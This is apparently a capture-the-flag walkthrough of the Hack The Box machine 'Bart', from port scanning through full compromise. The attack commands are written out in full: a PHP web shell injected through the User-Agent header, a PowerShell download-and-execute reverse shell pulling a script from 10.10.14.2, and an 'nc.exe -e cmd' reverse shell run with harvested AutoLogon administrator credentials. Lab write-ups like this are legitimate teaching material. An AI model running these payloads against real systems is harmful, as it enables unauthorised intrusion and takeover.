# Masscan + Nmap
```bash
$ masscan -p1-65535,U:1-65535 `IP` --rate=5000 -e tun0 | tee masscan.out
Discovered open port 80/tcp on 10.10.10.81

Parse those ports to nmap:
```bash
$ ports=$(cat masscan.out |awk '{ print $4 }' | sed 's/\/tcp//;s/\/udp//' | tr '\n' ',' | sed 's/,$//')
$ nmap -v -sVC --min-rate 1000 -p $ports `IP` -oN nmap-fullscan.out

# HTTP
## Forum
Visiting http server, it redirects to http://forum.bart.htb/ which I add to my /etc/hosts.
Directory fuzzing:
```bash
$ ffuf -u http://10.10.10.81/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -fc 200

```
Visiting /forum/ doesn't give much. Source code has some names and their mail-ids:
```
s.brown
d.simmons
r.hilton
h.potter
```
The last username is `Harvey Potter`, who's mentioned as `Developer@BART` and is commented out in the source code.

## Monitor
Visiting /monitor gives a login form.
If I try to login with `h.potter:anything` it says information incorrect.
But you can still enumerate the username with the forgot password option. It says _"Provided username couldn't be found."_  for a wrong username.

Even though the usernames were given in f.lastname format the username came out to be `harvey`.
Since the login form had a CSRF token, It isn't brute forcible with tools like hydra or burp. 
I tried some common passwords, combinations of `harvey:harvey` and so on..

`harvey:potter` worked and I logged in as developer Harvey Potter. 
Not any link in the page fetches to `monitor.bart.htb` so I add that to my hosts file.

The only thing interesting now is when you visit [monitor.bart.htb/?&mod=server](http://monitor.bart.htb/?&mod=server)

![bart-1.png](/assets/img/Posts/Bart/bart-1.png)

Which gives another virtual host for us to add in hosts file `internal-01.bart.htb`.

## Internal-01
Accessing Internal-01 gave another login portal. 
Entering any wrong password gives _"The Password must be at least 8 characters"_ or _"Invalid Username or Password"_.

- I can take the username list try spraying usernames with password once again. 
`f.lastname` already says username not valid, but that's because it contains a special character, as it accepts any user otherwise.
- Directory brute forcing `internal-01.bart.htb` and `/simple_chat/` leads nowhere.
- SQL injection doesn't look good here too.

Checking out the source code, I see only one CSS file loaded:
```html
<!DOCTYPE html">
<html>
	<head>
		<title>Login Form</title>
		<meta charset="UTF-8">
		<link type="text/css" rel="stylesheet" href="css/chat_global.css">
		<style type="text/css">
			#uname,  #passwd, #submit_login
```
It has comments as:
```css
/**********************************************\
* Copyright (c) 2013 Manolis Agkopian          *
* See the file LICENCE for copying permission. *
\**********************************************/

body , div, img, p, h1{
	font-family: arial; 
```

So the code is originally made by "Manolis Agkopian". If I Google something like:
> _"Manolis Agkopian chat login"_
> It gives: _"[magkopian/php-ajax-simple-chat](https://github.com/magkopian/php-ajax-simple-chat) Â· GitHub"_ 

- I tried to find any default credentials in that project, but that's not the case here.
- There's one .sql database file, but it doesn't contain any password too.

One thing to notice is Register option is removed from internal-01. The original project contains a file named `register.php` to register users and it looks something like this:

![bart-2.png](/assets/img/Posts/Bart/bart-2.png)

But if I try to access `register.php`, it redirects to `register_form.php`. 
`register.php` accepts POST requests which I can confirm by passing a OPTIONS request. (`TRACE, HEAD, POST`).
So, even if the register link is removed, register option remains and I can do that by passing a POST request.

```bash
$ curl -XPOST internal-01.bart.htb/simple_chat/register.php -d "uname=caretaker&passwd=caretaker" -i

After logging in, I see:

![bart-3.png](/assets/img/Posts/Bart/bart-3.png)

Bobby says Harvey not to put development code in the site. There are some comments in the source code, but this script tag is quite interesting.

# Log poisoning
```js
<script>
		function saveChat() {
			// create a serialized object and send to log_chat.php. Once done hte XHR request, alert "Done"
		var xhr = new XMLHttpRequest();
		xhr.onreadystatechange = function() {
    		if (xhr.readyState == XMLHttpRequest.DONE) {
        		alert(xhr.responseText);
    		}
		}
		xhr.open('GET', 'http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey', true);
		xhr.send(null);
		alert("Done");
</script>
```
This piece of code explain the functionality of `log` button on the page.
- Create a serialized object of the current request, store it in variable xhr.
- xhr.open() passes GET request to `/log/log.php` with a parameter `filename` containing a filename and username
- Pops an alert "Done"
- function is called and fetched requested from xhr.open() is alerted.

Let's change that `log.txt` filename to any other file, and try to make out what log.php is doing.
If I try to access `C:/boot.ini`:
```bash
$ curl -s 'http://internal-01.bart.htb/log/log.php?filename=C:\boot.ini&username=harvey' 

Warning: file_put_contents(C:\boot.ini): failed to open stream: Permission
denied in C:\inetpub\wwwroot\internal-01\log\log.php on line 41
1
```

So, log.php tries to run `file_put_contents()` on boot.ini, Since it did not have much permissions, it didn't work.
Let's try to write in current directory, where we might have perms.
```bash
$ curl -s 'http://internal-01.bart.htb/log/log.php?filename=.\caretaker.txt&username=harvey'  
1
$ curl http://internal-01.bart.htb/log/caretaker.txt
[2021-07-31 17:36:36] - harvey - curl/7.74.0[2021-07-31 17:36:52] - harvey - curl/7.74.0
```

I'll write a php file and inject php code using User-Agent headers.
```bash
$ curl -s 'http://internal-01.bart.htb/log/log.php?filename=.\test.php&username=harvey' -A '<?php system($_GET['cmd']); ?>'
1
$ curl -s 'http://internal-01.bart.htb/log/test.php?cmd=whoami'  
[2021-07-31 17:43:11] - harvey - nt authority\iusr
```

Now, I easily got a reverse-shell using `Invoke-PowerShellTcp.ps1` 
```bash
$ curl 'http://internal-01.bart.htb/log/test.php?cmd=powershell%20iex%20(New-Object%20Net.WebClient).DownloadString(%27http://10.10.14.2/Invoke-PowerShellTcp.ps1%27);Invoke-PowerShellTcp%20-Reverse%20-IPAddress%2010.10.14.2%20-Port%204444'
```
```bash
$ rlwrap nc -lnvp 4444
Listening on 0.0.0.0 4444

Windows PowerShell running as user BART$ on BART

PS C:\inetpub\wwwroot\internal-01\log> whoami
nt authority\iusr
```

Since, log.php contains file `file_put_contents()` here I could've wrote on any file. If I still wouldn't have write access to directory, I would've tried writing in log.php. 
Even if log.php wasn't writing in any file and it was a usual log file. The above idea would've worked.

# Privesc
Running winpeas shows:
```bash
  [+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  DESKTOP-7I3S68E
    DefaultUserName               :  Administrator
    DefaultPassword               :  3130438f31186fbaf962f407711faddb

```

I can see there are autologon credentials stored and there's no UAC.
First I need to change my shell (If I've spawned with Invoke-powershellTcp) as even if I setup my credentials correctly, I wouldn't be able to call functions like `Start-Process` or  `Invoke-Command` as they wouldn't be defined.

I got a new shell with netcat64 binary.
Then I can make PSCredential object:
```powershell
PS C:\> $SecPass = ConvertTo-SecureString '3130438f31186fbaf962f407711faddb' -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass);
PS C:\> Start-Process -FilePath "powershell" -argumentlist "C:\temp\nc.exe -e cmd 10.10.14.2 6666" -Credential $cred
```
And I got a shell as administrator.

```bash
$ nc -lnvp 6666
